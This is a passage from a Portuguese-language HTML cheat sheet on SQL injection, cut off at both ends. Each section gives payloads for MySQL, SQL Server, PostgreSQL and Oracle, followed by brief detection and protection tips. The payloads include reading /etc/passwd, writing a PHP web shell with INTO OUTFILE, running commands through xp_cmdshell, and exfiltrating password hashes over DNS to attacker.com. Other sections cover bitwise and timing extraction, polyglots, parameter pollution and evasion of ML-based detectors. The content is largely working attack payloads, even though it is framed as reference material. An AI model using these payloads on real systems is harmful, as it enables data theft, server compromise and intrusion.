<span class="code-string">'</span><span class="code-comment">/**/</span><span class="code-keyword">OR</span><span class="code-comment">/**/</span><span class="code-keyword">1</span>=<span class="code-keyword">1</span> <span class="code-comment">--</span>

<span class="code-comment">-- Misturando mai√∫sculas e min√∫sculas</span>
<span class="code-string">'</span> <span class="code-keyword">oR</span> <span class="code-number">1</span><span class="code-keyword">=</span><span class="code-number">1</span> <span class="code-comment">--</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o Comandos Avan√ßados -->
            <div class="content-section" id="advanced-commands">
                <div class="section-header">
                    <h1 class="section-title">Comandos Avan√ßados</h1>
                    <p class="section-description">Comandos que dependem de privil√©gios elevados para leitura/escrita de arquivos e execu√ß√£o de comandos</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Leitura e Escrita de Arquivos</h3>
                            <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                            <p>Comandos avan√ßados que exigem privil√©gios especiais:</p>
                            <div class="code-block">
<span class="code-comment">-- Leitura de Arquivos (MySQL)</span>
<span class="code-string">'</span> <span class="code-keyword">UNION SELECT</span> <span class="code-function">LOAD_FILE</span>(<span class="code-string">'/etc/passwd'</span>),<span class="code-keyword">2,3</span> <span class="code-comment">--</span>

<span class="code-comment">-- Escrita de Arquivos (Web Shell - MySQL)</span>
<span class="code-string">'</span> <span class="code-keyword">UNION SELECT</span> <span class="code-string">"&lt;?php system($_GET['c']); ?&gt;"</span>,<span class="code-keyword">2,3</span> <span class="code-keyword">INTO OUTFILE</span> <span class="code-string">'/var/www/html/shell.php'</span> <span class="code-comment">--</span>
                            </div>
                            <div class="db-badges">
                                <span class="db-badge mysql">MySQL</span>
                            </div>
                        </div>
                    </div>
                     <div class="card">
                        <div class="card-header">
                            <h3>Execu√ß√£o de Comandos (RCE)</h3>
                             <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                            <p>Execu√ß√£o de comandos no sistema operacional via SQLi:</p>
                            <div class="code-block">
<span class="code-comment">-- SQL Server</span>
<span class="code-string">'</span> ; <span class="code-keyword">EXEC</span> xp_cmdshell <span class="code-string">'whoami'</span> <span class="code-comment">--</span>

<span class="code-comment">-- MySQL (com UDF - User Defined Function)</span>
<span class="code-string">'</span> <span class="code-keyword">UNION SELECT</span> <span class="code-function">sys_exec</span>(<span class="code-string">'whoami'</span>)<span class="code-operator">,</span><span class="code-number">2</span> <span class="code-comment">--</span>

<span class="code-comment">-- PostgreSQL (CVE-2019-9193)</span>
<span class="code-string">'</span><span class="code-operator">;</span> <span class="code-operator">COPY</span> cmd_exec(<span class="code-string">'whoami'</span>) <span class="code-operator">TO</span> <span class="code-string">'/tmp/output'</span> <span class="code-comment">--</span>
                            </div>
                             <div class="db-badges">
                                <span class="db-badge mysql">MySQL</span>
                                <span class="db-badge mssql">SQL Server</span>
                                <span class="db-badge postgres">PostgreSQL</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o Bitwise -->
            <div class="content-section" id="bitwise">
                <div class="section-header">
                    <h1 class="section-title">M√°scara de Bits (Bitwise SQLi)</h1>
                    <p class="section-description">T√©cnica avan√ßada que usa operadores bitwise para extrair dados bit por bit</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Extra√ß√£o Bit a Bit</h3>
                            <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                            <p>Extrai dados usando operadores bitwise para contornar filtros baseados em strings:</p>
                            <div class="code-block">
<span class="code-comment">-- Extrair dados bit a bit (MySQL)</span>
<span class="code-string">'</span> <span class="code-operator">OR</span> (<span class="code-operator">SELECT</span> <span class="code-function">ASCII</span>(<span class="code-function">SUBSTRING</span>(password,<span class="code-number">1</span>,<span class="code-number">1</span>)) <span class="code-operator">&</span> <span class="code-number">1</span>) <span class="code-operator">=</span> <span class="code-number">1</span> <span class="code-comment">--</span>
<span class="code-string">'</span> <span class="code-operator">OR</span> (<span class="code-operator">SELECT</span> <span class="code-function">ASCII</span>(<span class="code-function">SUBSTRING</span>(password,<span class="code-number">1</span>,<span class="code-number">1</span>)) <span class="code-operator">>></span> <span class="code-number">1</span> <span class="code-operator">&</span> <span class="code-number">1</span>) <span class="code-operator">=</span> <span class="code-number">1</span> <span class="code-comment">--</span>

<span class="code-comment">-- Usando XOR para verifica√ß√£o</span>
<span class="code-string">'</span> <span class="code-operator">OR</span> (<span class="code-operator">SELECT</span> password <span class="code-operator">FROM</span> users <span class="code-operator">WHERE</span> username<span class="code-operator">=</span><span class="code-string">'admin'</span>) <span class="code-operator">^</span> <span class="code-string">'expected'</span> <span class="code-operator">=</span> <span class="code-number">0</span> <span class="code-comment">--</span>
                            </div>
                            <div class="db-badges">
                                <span class="db-badge mysql">MySQL</span>
                                <span class="db-badge postgres">PostgreSQL</span>
                                <span class="db-badge mssql">SQL Server</span>
                            </div>
                            <div class="detection-tip tip-box">
                                <strong>üéØ DETEC√á√ÉO:</strong> Monitore consultas contendo operadores bitwise (&, |, ^, ~, <<, >>) em par√¢metros de entrada.
                            </div>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è PROTE√á√ÉO:</strong> Bloqueie operadores bitwise em inputs de usu√°rio e valide o tipo de dados esperado.
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o JSON -->
            <div class="content-section" id="json">
                <div class="section-header">
                    <h1 class="section-title">Inje√ß√£o de JSON/Array</h1>
                    <p class="section-description">Explora fun√ß√µes de manipula√ß√£o de JSON e arrays em bancos de dados modernos</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Extra√ß√£o via JSON</h3>
                            <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                            <p>Utiliza fun√ß√µes JSON nativas para extrair dados de forma n√£o convencional:</p>
                            <div class="code-block">
<span class="code-comment">-- MySQL JSON Extraction</span>
<span class="code-string">'</span> <span class="code-operator">UNION SELECT</span> <span class="code-function">JSON_EXTRACT</span>(<span class="code-string">'{"user":"admin"}'</span>, <span class="code-string">'$.user'</span>), <span class="code-number">2</span> <span class="code-comment">--</span>
<span class="code-string">'</span> <span class="code-operator">UNION SELECT</span> <span class="code-function">JSON_KEYS</span>((<span class="code-operator">SELECT</span> <span class="code-function">JSON_OBJECT</span>(<span class="code-string">'pass'</span>, password) <span class="code-operator">FROM</span> users)), <span class="code-number">2</span> <span class="code-comment">--</span>

<span class="code-comment">-- PostgreSQL JSON</span>
<span class="code-string">'</span> <span class="code-operator">UNION SELECT</span> (<span class="code-operator">SELECT</span> <span class="code-function">json_agg</span>(table_name) <span class="code-operator">FROM</span> information_schema.tables), <span class="code-number">2</span> <span class="code-comment">--</span>

<span class="code-comment">-- Array exploitation (PostgreSQL)</span>
<span class="code-string">'</span> <span class="code-operator">UNION SELECT</span> <span class="code-function">array_to_string</span>(<span class="code-function">array</span>(<span class="code-operator">SELECT</span> password <span class="code-operator">FROM</span> users), <span class="code-string">','</span>), <span class="code-number">2</span> <span class="code-comment">--</span>
                            </div>
                            <div class="db-badges">
                                <span class="db-badge mysql">MySQL</span>
                                <span class="db-badge postgres">PostgreSQL</span>
                            </div>
                            <div class="detection-tip tip-box">
                                <strong>üéØ DETEC√á√ÉO:</strong> Monitore fun√ß√µes JSON (JSON_EXTRACT, JSON_OBJECT, json_agg) em queries n√£o esperadas.
                            </div>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è PROTE√á√ÉO:</strong> Restrinja o uso de fun√ß√µes JSON/Array para usu√°rios n√£o privilegiados.
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o Timing -->
            <div class="content-section" id="timing">
                <div class="section-header">
                    <h1 class="section-title">Ataques de Timing Diferencial</h1>
                    <p class="section-description">T√©cnicas que usam diferen√ßas sutis no tempo de resposta para extrair dados</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Timing com Computa√ß√£o Pesada</h3>
                            <span class="risk-badge medium">RISCO M√âDIO</span>
                        </div>
                        <div class="card-body">
                            <p>Usa opera√ß√µes computacionalmente intensas em vez de fun√ß√µes SLEEP() expl√≠citas:</p>
                            <div class="code-block">
<span class="code-comment">-- MySQL - Heavy computation timing</span>
<span class="code-string">'</span> <span class="code-operator">AND</span> (<span class="code-operator">SELECT</span> <span class="code-function">BENCHMARK</span>(<span class="code-number">10000000</span>, <span class="code-function">MD5</span>(<span class="code-string">'test'</span>))) <span class="code-comment">--</span>
<span class="code-string">'</span> <span class="code-operator">AND</span> (<span class="code-operator">SELECT</span> <span class="code-number">1</span> <span class="code-operator">FROM</span> (<span class="code-operator">SELECT</span> <span class="code-function">SLEEP</span>(<span class="code-number">5</span>) <span class="code-operator">FROM</span> information_schema.tables A, information_schema.tables B, information_schema.tables C) <span class="code-operator">AS</span> x) <span class="code-comment">--</span>

<span class="code-comment">-- PostgreSQL - Complex query timing</span>
<span class="code-string">'</span> <span class="code-operator">AND</span> (<span class="code-operator">SELECT</span> <span class="code-number">1</span> <span class="code-operator">FROM</span> <span class="code-function">generate_series</span>(<span class="code-number">1</span>,<span class="code-number">1000000</span>)) <span class="code-comment">--</span>

<span class="code-comment">-- SQL Server - CPU intensive</span>
<span class="code-string">'</span> <span class="code-operator">AND</span> (<span class="code-operator">SELECT</span> <span class="code-number">COUNT</span>(<span class="code-operator">*</span>) <span class="code-operator">FROM</span> sysobjects A, sysobjects B, sysobjects C) <span class="code-operator">></span> <span class="code-number">0</span> <span class="code-comment">--</span>
                            </div>
                            <div class="db-badges">
                                <span class="db-badge mysql">MySQL</span>
                                <span class="db-badge postgres">PostgreSQL</span>
                                <span class="db-badge mssql">SQL Server</span>
                            </div>
                            <div class="detection-tip tip-box">
                                <strong>üéØ DETEC√á√ÉO:</strong> Implemente monitoring de queries com tempo de execu√ß√£o anormal e cross-joins massivos.
                            </div>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è PROTE√á√ÉO:</strong> Configure timeouts rigorosos e limite a complexidade das queries.
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o Polyglot -->
            <div class="content-section" id="polyglot">
                <div class="section-header">
                    <h1 class="section-title">Polyglot Payloads</h1>
                    <p class="section-description">Payloads que funcionam em m√∫ltiplos contextos e sistemas</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Payloads Universais</h3>
                            <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                            <p>Payloads que funcionam em m√∫ltiplos bancos de dados e contextos:</p>
                            <div class="code-block">
<span class="code-comment">-- Polyglot para MySQL e JavaScript</span>
<span class="code-string">'</span><span class="code-operator">;</span> <span class="code-operator">SELECT</span> <span class="code-number">1</span><span class="code-operator">;</span> <span class="code-comment">/*</span><span class="code-string">' OR 1=1; // */</span>

<span class="code-comment">-- Polyglot para SQL e LDAP</span>
<span class="code-string">*</span><span class="code-operator">)(</span><span class="code-operator">&</span><span class="code-operator">)</span> <span class="code-operator">|</span> <span class="code-operator">(</span><span class="code-operator">%</span><span class="code-number">26</span><span class="code-operator">)</span><span class="code-string">' UNION SELECT 1,2,3-- -</span>

<span class="code-comment">-- Universal polyglot</span>
<span class="code-string">'</span><span class="code-operator">;</span> <span class="code-operator">SELECT</span> <span class="code-comment">/*!50000 1 */</span> <span class="code-operator">FROM</span> users<span class="code-operator">;</span> <span class="code-comment">/*</span> <span class="code-string">' OR 1=1-- -</span> <span class="code-string">"; -- //</span>
                            </div>
                            <div class="detection-tip tip-box">
                                <strong>üéØ DETEC√á√ÉO:</strong> Use WAFs com assinaturas de polyglot payloads e analise contextos m√∫ltiplos.
                            </div>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è PROTE√á√ÉO:</strong> Valida√ß√£o estrita de input por contexto e escaping apropriado para cada camada.
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o DNS Exfiltration -->
            <div class="content-section" id="dns">
                <div class="section-header">
                    <h1 class="section-title">DNS Exfiltration Avan√ßado</h1>
                    <p class="section-description">T√©cnicas sofisticadas de exfiltra√ß√£o de dados via DNS</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Exfiltra√ß√£o via DNS</h3>
                            <span class="risk-badge medium">RISCO M√âDIO</span>
                        </div>
                        <div class="card-body">
                            <p>Usa requisi√ß√µes DNS para exfiltrar dados contornando firewalls tradicionais:</p>
                            <div class="code-block">
<span class="code-comment">-- MySQL - DNS com subdom√≠nios</span>
<span class="code-string">'</span> <span class="code-operator">AND</span> (<span class="code-operator">SELECT</span> <span class="code-function">LOAD_FILE</span>(<span class="code-function">CONCAT</span>(<span class="code-string">'\\\\'</span>, (<span class="code-operator">SELECT</span> <span class="code-function">HEX</span>(password) <span class="code-operator">FROM</span> users <span class="code-operator">LIMIT</span> <span class="code-number">1</span>), <span class="code-string">'.attacker.com\\test.txt'</span>))) <span class="code-comment">--</span>

<span class="code-comment">-- SQL Server - xp_dirtree</span>
<span class="code-string">'</span> <span class="code-operator">; EXEC</span> master..xp_dirtree <span class="code-string">'\\'</span> <span class="code-operator">+</span> (<span class="code-operator">SELECT</span> <span class="code-function">TOP</span> <span class="code-number">1</span> <span class="code-function">CAST</span>(password <span class="code-operator">AS</span> <span class="code-keyword">VARCHAR</span>(<span class="code-number">8000</span>)) <span class="code-operator">FROM</span> users) <span class="code-operator">+</span> <span class="code-string">'.attacker.com\test'</span> <span class="code-comment">--</span>

<span class="code-comment">-- Oracle - UTL_INADDR</span>
<span class="code-string">'</span> <span class="code-operator">||</span> (<span class="code-operator">SELECT</span> <span class="code-function">UTL_INADDR.GET_HOST_ADDRESS</span>((<span class="code-operator">SELECT</span> password <span class="code-operator">FROM</span> users <span class="code-operator">WHERE</span> rownum<span class="code-operator">=</span><span class="code-number">1</span>)<span class="code-operator">||</span><span class="code-string">'.attacker.com'</span>) <span class="code-operator">FROM</span> DUAL) <span class="code-comment">--</span>
                            </div>
                            <div class="db-badges">
                                <span class="db-badge mysql">MySQL</span>
                                <span class="db-badge mssql">SQL Server</span>
                                <span class="db-badge oracle">Oracle</span>
                            </div>
                            <div class="detection-tip tip-box">
                                <strong>üéØ DETEC√á√ÉO:</strong> Monitore queries contendo fun√ß√µes de rede (LOAD_FILE, xp_dirtree, UTL_INADDR) e requisi√ß√µes DNS an√¥malas.
                            </div>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è PROTE√á√ÉO:</strong> Restrinja fun√ß√µes de rede, implemente egress filtering e monitore tr√°fego DNS.
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o Regex -->
            <div class="content-section" id="regex">
                <div class="section-header">
                    <h1 class="section-title">Regex & Chained Queries</h1>
                    <p class="section-description">Combina express√µes regulares com queries encadeadas para bypass avan√ßado</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Queries com Express√µes Regulares</h3>
                            <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                            <p>Usa regex para criar condi√ß√µes complexas e extrair dados precisamente:</p>
                            <div class="code-block">
<span class="code-comment">-- PostgreSQL - Regex com chained queries</span>
<span class="code-string">'</span> <span class="code-operator">UNION SELECT</span> <span class="code-number">1</span>, (<span class="code-operator">SELECT</span> <span class="code-function">string_agg</span>(table_name, <span class="code-string">','</span>) <span class="code-operator">FROM</span> information_schema.tables <span class="code-operator">WHERE</span> table_schema <span class="code-operator">~</span> <span class="code-string">'^public'</span>), <span class="code-number">3</span> <span class="code-comment">--</span>

<span class="code-comment">-- MySQL - Regex no WHERE para validar formato de hash</span>
<span class="code-string">'</span> <span class="code-operator">AND</span> (<span class="code-operator">SELECT</span> password <span class="code-operator">FROM</span> users <span class="code-operator">WHERE</span> username<span class="code-operator">=</span><span class="code-string">'admin'</span> <span class="code-operator">REGEXP</span> <span class="code-string">'^[a-f0-9]{32}$'</span>) <span class="code-comment">--</span>

<span class="code-comment">-- Oracle - Regex com extract</span>
<span class="code-string">'</span> <span class="code-operator">UNION SELECT</span> <span class="code-number">1</span>, (<span class="code-operator">SELECT</span> <span class="code-function">EXTRACTVALUE</span>(XMLType(dbms_xmlgen.getxml(<span class="code-string">'select password from users'</span>)),<span class="code-string">'/ROWSET/ROW/PASSWORD'</span>) <span class="code-operator">FROM</span> dual), <span class="code-number">3</span> <span class="code-comment">--</span>
                            </div>
                            <div class="db-badges">
                                <span class="db-badge postgres">PostgreSQL</span>
                                <span class="db-badge mysql">MySQL</span>
                                <span class="db-badge oracle">Oracle</span>
                            </div>
                            <div class="detection-tip tip-box">
                                <strong>üéØ DETEC√á√ÉO:</strong> Monitore uso de fun√ß√µes regex em queries e padr√µes complexos de chained queries.
                            </div>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è PROTE√á√ÉO:</strong> Limite fun√ß√µes regex para usu√°rios privilegiados e implemente an√°lise comportamental.
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o Context -->
            <div class="content-section" id="context">
                <div class="section-header">
                    <h1 class="section-title">Context-Aware Bypass</h1>
                    <p class="section-description">T√©cnicas que se adaptam dinamicamente ao contexto da aplica√ß√£o</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Bypass Adaptativo</h3>
                            <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                            <p>Detecta o ambiente e adapta o ataque automaticamente:</p>
                            <div class="code-block">
<span class="code-comment">-- Detecta e adapta ao tipo de banco</span>
<span class="code-string">'</span> <span class="code-operator">UNION SELECT</span> 
<span class="code-operator">CASE</span> 
  <span class="code-operator">WHEN</span> (<span class="code-function">CHAR</span>(<span class="code-number">126</span>))<span class="code-operator">IS NOT NULL</span> <span class="code-operator">THEN</span> <span class="code-string">'PostgreSQL'</span> <span class="code-comment">-- Tilde is for Postgres</span>
  <span class="code-operator">WHEN</span> (<span class="code-function">@@version</span>) <span class="code-operator">LIKE</span> <span class="code-string">'%Microsoft%'</span> <span class="code-operator">THEN</span> <span class="code-string">'MSSQL'</span>
  <span class="code-operator">ELSE</span> <span class="code-string">'MySQL/Unknown'</span>
<span class="code-operator">END</span>, <span class="code-number">2</span>, <span class="code-number">3</span> <span class="code-comment">--</span>

<span class="code-comment">-- Bypass adaptativo baseado em erro (Error-based)</span>
<span class="code-string">'</span> <span class="code-operator">AND</span> <span class="code-number">1</span><span class="code-operator">=</span>(<span class="code-operator">CASE</span> <span class="code-operator">WHEN</span> (<span class="code-operator">SELECT</span> <span class="code-number">COUNT</span>(<span class="code-operator">*</span>) <span class="code-operator">FROM</span> users)><span class="code-number">0</span> <span class="code-operator">THEN</span> <span class="code-number">1</span> <span class="code-operator">ELSE</span> <span class="code-function">CAST</span>(<span class="code-string">'X'</span> <span class="code-operator">AS</span> <span class="code-keyword">INT</span>) <span class="code-operator">END</span>) <span class="code-comment">--</span>
                            </div>
                            <div class="db-badges">
                                <span class="db-badge mysql">MySQL</span>
                                <span class="db-badge mssql">SQL Server</span>
                                <span class="db-badge postgres">PostgreSQL</span>
                            </div>
                            <div class="detection-tip tip-box">
                                <strong>üéØ DETEC√á√ÉO:</strong> Implemente honeypots e monitore padr√µes de reconhecimento de ambiente.
                            </div>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è PROTE√á√ÉO:</strong> Minimize informa√ß√µes de erro e implemente defesa em profundidade.
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o HPP -->
            <div class="content-section" id="hpp">
                <div class="section-header">
                    <h1 class="section-title">HTTP Parameter Pollution + SQLi</h1>
                    <p class="section-description">Combina HPP com SQL Injection para contornar valida√ß√µes em diferentes camadas</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Parameter Pollution</h3>
                            <span class="risk-badge medium">RISCO M√âDIO</span>
                        </div>
                        <div class="card-body">
                            <p>Explora como aplica√ß√µes processam par√¢metros duplicados:</p>
                            <div class="code-block">
<span class="code-comment">-- HPP com SQLi (par√¢metros duplicados)</span>
?id=<span class="code-number">1</span><span class="code-operator">&</span>id=<span class="code-string">' UNION SELECT 1,2,3--</span>

<span class="code-comment">-- Explora√ß√£o de diferentes parsers (PHP vs. ASP.NET)</span>
?id=<span class="code-number">1</span><span class="code-operator">&</span>id=<span class="code-string">' UNION SELECT 1,version(),3--</span>

<span class="code-comment">-- Parameter fragmentation (evita detec√ß√£o por palavra-chave)</span>
?p1=<span class="code-string">'UNI</span><span class="code-operator">&</span>p2=<span class="code-string">ON'</span><span class="code-operator">&</span>p3=<span class="code-string">'SEL'</span><span class="code-operator">&</span>p4=<span class="code-string">'ECT...'</span>
                            </div>
                            <div class="detection-tip tip-box">
                                <strong>üéØ DETEC√á√ÉO:</strong> Monitore par√¢metros duplicados e arrays em requisi√ß√µes HTTP.
                            </div>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è PROTE√á√ÉO:</strong> Normalize par√¢metros HTTP antes do processamento e valide estrutura de inputs.
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o Window -->
            <div class="content-section" id="window">
                <div class="section-header">
                    <h1 class="section-title">Window Function Injection</h1>
                    <p class="section-description">Explora fun√ß√µes de janela para extra√ß√£o de dados n√£o convencional</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Fun√ß√µes de Janela</h3>
                            <span class="risk-badge medium">RISCO M√âDIO</span>
                        </div>
                        <div class="card-body">
                            <p>Usa fun√ß√µes de janela para manipular e extrair dados:</p>
                            <div class="code-block">
<span class="code-comment">-- PostgreSQL Window Functions</span>
<span class="code-string">'</span> <span class="code-operator">UNION SELECT</span> <span class="code-function">ROW_NUMBER</span>() <span class="code-operator">OVER</span> (), table_name, <span class="code-number">3</span> <span class="code-operator">FROM</span> information_schema.tables <span class="code-comment">--</span>

<span class="code-comment">-- SQL Server - Lead/Lag para data exfiltration</span>
<span class="code-string">'</span> <span class="code-operator">UNION SELECT</span> <span class="code-number">1</span>, (<span class="code-operator">SELECT</span> <span class="code-function">STRING_AGG</span>(password, <span class="code-string">','</span>) <span class="code-operator">WITHIN</span> <span class="code-operator">GROUP</span> (<span class="code-operator">ORDER</span> <span class="code-operator">BY</span> password) <span class="code-operator">FROM</span> users), <span class="code-number">3</span> <span class="code-comment">--</span>

<span class="code-comment">-- MySQL 8.0+ Window Functions</span>
<span class="code-string">'</span> <span class="code-operator">UNION SELECT</span> <span class="code-function">ROW_NUMBER</span>() <span class="code-operator">OVER</span> (<span class="code-operator">ORDER</span> <span class="code-operator">BY</span> (<span class="code-operator">SELECT</span> <span class="code-number">1</span>)) <span class="code-operator">AS</span> rn, table_name, <span class="code-number">3</span> <span class="code-operator">FROM</span> information_schema.tables <span class="code-comment">--</span>
                            </div>
                            <div class="db-badges">
                                <span class="db-badge postgres">PostgreSQL</span>
                                <span class="db-badge mssql">SQL Server</span>
                                <span class="db-badge mysql">MySQL</span>
                            </div>
                            <div class="detection-tip tip-box">
                                <strong>üéØ DETEC√á√ÉO:</strong> Monitore uso de fun√ß√µes de janela (OVER, ROW_NUMBER, LEAD, LAG) em queries suspeitas.
                            </div>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è PROTE√á√ÉO:</strong> Restrinja fun√ß√µes avan√ßadas de SQL e implemente least privilege.
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o ML Evasion -->
            <div class="content-section" id="ml">
                <div class="section-header">
                    <h1 class="section-title">Machine Learning Evasion</h1>
                    <p class="section-description">T√©cnicas que exploram vulnerabilidades em sistemas de detec√ß√£o baseados em ML</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Evas√£o de Machine Learning</h3>
                            <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                            <p>Engana modelos de detec√ß√£o automatizados usando t√©cnicas adversariais:</p>
                            <div class="code-block">
<span class="code-comment">-- Adversarial examples para ML</span>
<span class="code-string">'</span> <span class="code-comment">/**/uNiOn/**/sElEcT/**/1,2,3</span> <span class="code-comment">--</span>

<span class="code-comment">-- Unicode normalization attacks</span>
<span class="code-string">'</span> <span class="code-operator">OR</span> <span class="code-number">1</span><span class="code-operator">=</span><span class="code-number">1</span> <span class="code-comment">--</span>  <span class="code-comment">// Usando caracteres hom√≥glifos</span>

<span class="code-comment">-- Ofusca√ß√£o com contexto</span>
<span class="code-string">'</span> <span class="code-operator">AND</span> <span class="code-number">1</span><span class="code-operator">=</span>(<span class="code-operator">SELECT</span> <span class="code-number">1</span> <span class="code-operator">FROM</span> (<span class="code-operator">SELECT</span> <span class="code-function">SLEEP</span>(<span class="code-number">5</span>))<span class="code-operator">x</span>) <span class="code-comment">--</span>
                            </div>
                            <div class="detection-tip tip-box">
                                <strong>üéØ DETEC√á√ÉO:</strong> Use m√∫ltiplas camadas de detec√ß√£o e atualize modelos de ML regularmente.
                            </div>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è PROTE√á√ÉO:</strong> Combine ML com regras est√°ticas e an√°lise comportamental.
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o AI-Powered SQLi -->
            <div class="content-section" id="ai">
                <div class="section-header">
                    <h1 class="section-title">SQL Injection com IA</h1>
                    <p class="section-description">T√©cnicas que utilizam intelig√™ncia artificial para automatizar e otimizar ataques de SQL Injection</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>IA para Gera√ß√£o de Payloads</h3>
                            <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                            <p>Uso de modelos de linguagem para gerar payloads adaptativos e evasivos:</p>
                            <div class="code-block">
<span class="code-comment">-- Gera√ß√£o autom√°tica de payloads com IA</span>
<span class="code-comment">-- Payloads contextuais baseados em an√°lise de resposta</span>
<span class="code-string">'</span> <span class="code-operator">OR</span> <span class="code-function">EXISTS</span>(<span class="code-operator">SELECT</span> <span class="code-number">1</span> <span class="code-operator">FROM</span> (<span class="code-operator">SELECT</span> <span class="code-function">COUNT</span>(<span class="code-operator">*</span>) <span class="code-operator">AS</span> c <span class="code-operator">FROM</span> information_schema.tables) t <span class="code-operator">WHERE</span> t.c<span class="code-operator">></span><span class="code-number">0</span>) <span class="code-comment">--</span>

<span class="code-comment">-- Ataque generativo adaptativo</span>
<span class="code-string">'</span> <span class="code-operator">UNION</span> <span class="code-comment">/*!50000 SELECT*/</span> <span class="code-number">1</span>,<span class="code-function">CONCAT</span>(<span class="code-string">'['</span>,<span class="code-function">GROUP_CONCAT</span>(table_name),<span class="code-string">']'</span>),<span class="code-number">3</span> <span class="code-operator">FROM</span> information_schema.tables <span class="code-operator">WHERE</span> table_schema<span class="code-operator">=</span><span class="code-function">DATABASE</span>() <span class="code-comment">--</span>
                            </div>
                            <div class="db-badges">
                                <span class="db-badge mysql">MySQL</span>
                                <span class="db-badge postgres">PostgreSQL</span>
                            </div>
                            <div class="detection-tip tip-box">
                                <strong>üéØ DETEC√á√ÉO:</strong> Monitore padr√µes de consulta generativos e uso de fun√ß√µes de agrega√ß√£o em contextos incomuns.
                            </div>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è PROTE√á√ÉO:</strong> Implemente modelos de ML para detectar comportamentos an√¥malos e use rate limiting agressivo.
                            </div>
                        </div>
                    </div>

                    <div class="card">
                        <div class="card-header">
                            <h3>Automa√ß√£o Inteligente com IA</h3>
                            <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                            <p>Sistemas aut√¥nomos que aprendem e se adaptam em tempo real:</p>
                            <div class="code-block">
<span class="code-comment"># Script Python com IA para SQLi adaptativo</span>
<span class="code-keyword">import</span> requests
<span class="code-keyword">import</span> re

<span class="code-keyword">class</span> AdaptiveSQLi:
    <span class="code-keyword">def</span> <span class="code-function">__init__</span>(<span class="code-keyword">self</span>):
        <span class="code-keyword">self</span>.learned_patterns = []
    
    <span class="code-keyword">def</span> <span class="code-function">generate_payload</span>(<span class="code-keyword">self</span>, response):
        <span class="code-comment"># IA analisa a resposta para adaptar o pr√≥ximo payload</span>
        <span class="code-keyword">if</span> <span class="code-string">"error"</span> <span class="code-keyword">in</span> response.text.lower():
            <span class="code-keyword">return</span> <span class="code-string">"' AND 1=1 --"</span>
        <span class="code-keyword">else</span>:
            <span class="code-keyword">return</span> <span class="code-string">"' OR 'a'='a' --"</span>
                            </div>
                            <div class="detection-tip tip-box">
                                <strong>üéØ DETEC√á√ÉO:</strong> Identifique padr√µes de requisi√ß√µes sequenciais com pequenas varia√ß√µes e user-agents suspeitos.
                            </div>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è PROTE√á√ÉO:</strong> Use desafios comportamentais (CAPTCHA) e an√°lise de sess√£o.
                            </div>
                        </div>
                    </div>
                </div>
            </div>

             <!-- Se√ß√£o Second Order -->
            <div class="content-section" id="second-order">
                <div class="section-header">
                    <h1 class="section-title">Second Order SQL Injection</h1>
                    <p class="section-description">Inje√ß√£o em dados que s√£o armazenados e executados posteriormente</p>
                </div>
                <div class="card">
                    <div class="card-header">
                        <h3>Explora√ß√£o de Second Order SQLi</h3>
                        <span class="risk-badge high">ALTO RISCO</span>
                    </div>
                    <div class="card-body">
